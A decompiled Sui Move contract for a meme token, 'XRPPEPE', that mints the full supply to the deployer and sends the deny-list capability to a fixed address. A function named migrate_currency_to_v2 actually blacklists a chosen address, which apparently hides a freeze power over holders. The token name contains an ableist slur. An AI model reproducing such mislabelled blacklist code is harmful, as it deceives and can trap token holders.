module 0xce815ea6324dd21a6749ade80cbe305e5a34dae35998b33746d5c701991fb9b8::xrppepe {
    struct XRPPEPE has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<XRPPEPE>, arg1: 0x2::coin::Coin<XRPPEPE>) {
        0x2::coin::burn<XRPPEPE>(arg0, arg1);
    }

    fun init(arg0: XRPPEPE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<XRPPEPE>(arg0, 9, b"XRPPEPE", b"EXtREMeLY ReTaRdED PepE", b"EXtREMeLY ReTaRdED PepE (XRPEPE)", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.ibb.co/8gDby3L/XRPPEPE.jpg")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<XRPPEPE>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<XRPPEPE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<XRPPEPE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<XRPPEPE>>(v1, @0x4feaf866c5ae9f7f90982b77ab0a476a23b9b51a3ab83755330099245af72d1f);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<XRPPEPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<XRPPEPE>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<XRPPEPE>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<XRPPEPE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

